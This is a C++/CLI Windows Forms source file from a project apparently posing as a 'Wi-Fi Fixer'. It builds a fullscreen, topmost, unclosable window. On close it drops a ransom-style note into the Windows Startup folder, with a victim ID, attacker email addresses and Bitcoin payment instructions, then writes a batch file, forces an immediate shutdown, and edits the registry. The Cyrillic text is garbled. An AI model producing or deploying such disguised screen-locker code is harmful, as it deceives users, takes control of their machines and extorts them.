#pragma once

namespace wififixer {

	using namespace System;
	using namespace System::ComponentModel;
	using namespace System::Collections;
	using namespace System::Windows::Forms;
	using namespace System::Data;
	using namespace System::Drawing;

	/// <summary>
	/// ������ ��� alert
	/// </summary>
	public ref class alert : public System::Windows::Forms::Form
	{
	public:
		alert(void)
		{
			InitializeComponent();
			//
			//TODO: �������� ��� ������������
			//
		}

	protected:
		/// <summary>
		/// ���������� ��� ������������ �������.
		/// </summary>
		~alert()
		{
			if (components)
			{
				delete components;
			}
		}

	private: System::Windows::Forms::PictureBox^ pictureBox1;
	private: System::Windows::Forms::Timer^ timer1;
	private: System::ComponentModel::IContainer^ components;
	private: System::Windows::Forms::PictureBox^ pictureBox2;


	protected:
	private: int LGBT_lover_im_gay = 0;


	private:
		/// <summary>
		/// ������������ ���������� ������������.
		/// </summary>


#pragma region Windows Form Designer generated code
		/// <summary>
		/// ��������� ����� ��� ��������� ������������ � �� ��������� 
		/// ���������� ����� ������ � ������� ��������� ����.
		/// </summary>
		void InitializeComponent(void)
		{
			this->components = (gcnew System::ComponentModel::Container());
			System::ComponentModel::ComponentResourceManager^ resources = (gcnew System::ComponentModel::ComponentResourceManager(alert::typeid));
			this->pictureBox1 = (gcnew System::Windows::Forms::PictureBox());
			this->timer1 = (gcnew System::Windows::Forms::Timer(this->components));
			this->pictureBox2 = (gcnew System::Windows::Forms::PictureBox());
			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->pictureBox1))->BeginInit();
			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->pictureBox2))->BeginInit();
			this->SuspendLayout();
			// 
			// pictureBox1
			// 
			this->pictureBox1->Anchor = static_cast<System::Windows::Forms::AnchorStyles>((((System::Windows::Forms::AnchorStyles::Top | System::Windows::Forms::AnchorStyles::Bottom)
				| System::Windows::Forms::AnchorStyles::Left)
				| System::Windows::Forms::AnchorStyles::Right));
			this->pictureBox1->BackgroundImage = (cli::safe_cast<System::Drawing::Image^>(resources->GetObject(L"pictureBox1.BackgroundImage")));
			this->pictureBox1->BackgroundImageLayout = System::Windows::Forms::ImageLayout::Stretch;
			this->pictureBox1->Location = System::Drawing::Point(0, 0);
			this->pictureBox1->Name = L"pictureBox1";
			this->pictureBox1->Size = System::Drawing::Size(863, 602);
			this->pictureBox1->SizeMode = System::Windows::Forms::PictureBoxSizeMode::StretchImage;
			this->pictureBox1->TabIndex = 2;
			this->pictureBox1->TabStop = false;
			// 
			// timer1
			// 
			this->timer1->Interval = 250;
			this->timer1->Tick += gcnew System::EventHandler(this, &alert::timer1_Tick);
			// 
			// pictureBox2
			// 
			this->pictureBox2->Anchor = static_cast<System::Windows::Forms::AnchorStyles>((((System::Windows::Forms::AnchorStyles::Top | System::Windows::Forms::AnchorStyles::Bottom)
				| System::Windows::Forms::AnchorStyles::Left)
				| System::Windows::Forms::AnchorStyles::Right));
			this->pictureBox2->BackgroundImage = (cli::safe_cast<System::Drawing::Image^>(resources->GetObject(L"pictureBox2.BackgroundImage")));
			this->pictureBox2->BackgroundImageLayout = System::Windows::Forms::ImageLayout::Stretch;
			this->pictureBox2->Location = System::Drawing::Point(0, 0);
			this->pictureBox2->Name = L"pictureBox2";
			this->pictureBox2->Size = System::Drawing::Size(863, 602);
			this->pictureBox2->SizeMode = System::Windows::Forms::PictureBoxSizeMode::StretchImage;
			this->pictureBox2->TabIndex = 3;
			this->pictureBox2->TabStop = false;
			// 
			// alert
			// 
			this->AutoScaleDimensions = System::Drawing::SizeF(6, 13);
			this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
			this->BackColor = System::Drawing::Color::White;
			this->ClientSize = System::Drawing::Size(863, 602);
			this->ControlBox = false;
			this->Controls->Add(this->pictureBox1);
			this->Controls->Add(this->pictureBox2);
			this->FormBorderStyle = System::Windows::Forms::FormBorderStyle::None;
			this->Name = L"alert";
			this->ShowIcon = false;
			this->ShowInTaskbar = false;
			this->StartPosition = System::Windows::Forms::FormStartPosition::CenterScreen;
			this->Text = L"alert";
			this->TopMost = true;
			this->WindowState = System::Windows::Forms::FormWindowState::Maximized;
			this->FormClosing += gcnew System::Windows::Forms::FormClosingEventHandler(this, &alert::alert_FormClosing);
			this->FormClosed += gcnew System::Windows::Forms::FormClosedEventHandler(this, &alert::alert_FormClosed);
			this->Load += gcnew System::EventHandler(this, &alert::alert_Load);
			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->pictureBox1))->EndInit();
			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->pictureBox2))->EndInit();
			this->ResumeLayout(false);

		}
	private: System::Void alert_FormClosing(System::Object^ sender, System::Windows::Forms::FormClosingEventArgs^ e) {
		if (!right_close)
			e->Cancel = true;
	}
	private: System::Void alert_Load(System::Object^ sender, System::EventArgs^ e) {
		this->timer1->Start();
	}
	private: System::Void alert_FormClosed(System::Object^ sender, System::Windows::Forms::FormClosedEventArgs^ e) {
		if (!right_close) {
			std::ofstream file("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\README.txt");
			if (file.is_open()) {
				file << "���� ����� �����������!\n��� ������ �������������\n6A02000000000000***242FB01\n���� ���������, ����������, ���� ������ � ������ ������ ������ ���� �����������.\n��� �������������� ������ ��������� �����������.\n����� �������� �����������, ������� ��������� ������ �� ����������� ����� iluha.bolshoi.pisun228@tutanota.com (iluha.bolshoi.pisun228@mail.ee, iluha.bolshoi.pisun228@yandex.by)\n� ������ ������� ��� ������ ������������� (��.� ������ ������� ���������).\n����� ���������� �������� ��������� ������������. � �������� ������ �� �������� �����\nBitcoin - ��������, �� ������� ���������� ��������� ������� �������� ������� � ����� �������.\n���� � ��� ��� ���������\n*�������� ������� Bitcoin: https://blockchain.info/ru/wallet/new\n*����������� ������������ Bitcoin:\nhttps://localbitcoins.com/ru/buy_bitcoins (Visa/MasterCard, QIWI Visa Wallet � ��.)\n*��������� ��������� ���������� BTC �� ��������� � ������ �����\n����� �������� ������� ����� �����������, �� �������� ����������� ������ ��� ������ ����������.\n����� ������� ��������� - ������������ ��� ���� ����� ����� �������������.\n�������� ����������� ������.\n����� ������� �� ������ ��������� ��� �� 3� ������ ��� ���������� �����������.\n��� �� ������ ��������� ������ ����������, ����� ������ ������ ������ ���� �� ����� 10 ��.\n��������!\n*�� ��������� ������� ��������� ��� ��������� ������������ ��������\n*������� ��������������� ����������� ������ �������� � ������ ����� ������\n*����������� ������ ������������� ������������ � ������ �������, ��� ��� � ������� ������������ ���������� ���� ����������\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n��� �������: ��� ���� �����, � ������ ������� �� � �������. WI-FI Fixer � ��������� ����������, �������� ����������. � ������ ������!\n��������� \"C:\\clear.bat\" ����� ������� ��� ���������";
				file.close();
			}
			std::ofstream clear("C:\\clear.bat");
			if (clear.is_open()) {
				clear << "@echo off\nsetlocal EnableDelayedExpansion\n\n>nul 2>&1\"%SYSTEMROOT%\\system32\\icacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\" && (set \"cmd=runas /user:Administrator \"%~dpnx0\"\"\ngoto doCmd\n) || (\necho Administrator rights are required to run this script.\npause\nexit /b1n)\n\n:doCmd\nDEL \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\README.txt\"\ndel %0";
				clear.close();
			}
			system("shutdown /s /t 00");
			right_close = true;
			BlockInput(false);
			std::ofstream disable_task("C:\\1.reg");
			if (disable_task.is_open()) {
				disable_task << "Windows Registry Editor Version 5.00\n\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System]\n\"DisableTaskMgr\"=dword:00000000";
				disable_task.close();
				system("regedit /s C:\\1.reg >nul");
				remove("C:\\1.reg");
			}
			Application::Exit();
		}
	}
	private: System::Void timer1_Tick(System::Object^ sender, System::EventArgs^ e) {
		if (this->LGBT_lover_im_gay == 0)
			this->pictureBox1->Visible = true;
		else if (this->LGBT_lover_im_gay == 1)
			this->pictureBox1->Visible = false;
		else if (this->LGBT_lover_im_gay == 2)
			this->pictureBox1->Visible = true;
		else if (this->LGBT_lover_im_gay == 3)
			this->pictureBox1->Visible = false;
		else if (this->LGBT_lover_im_gay == 4)
			this->pictureBox1->Visible = true;
		else if (this->LGBT_lover_im_gay == 5) {
			this->pictureBox1->Visible = false;
			this->LGBT_lover_im_gay = -1;
		}
		this->LGBT_lover_im_gay++;
	}
	};
}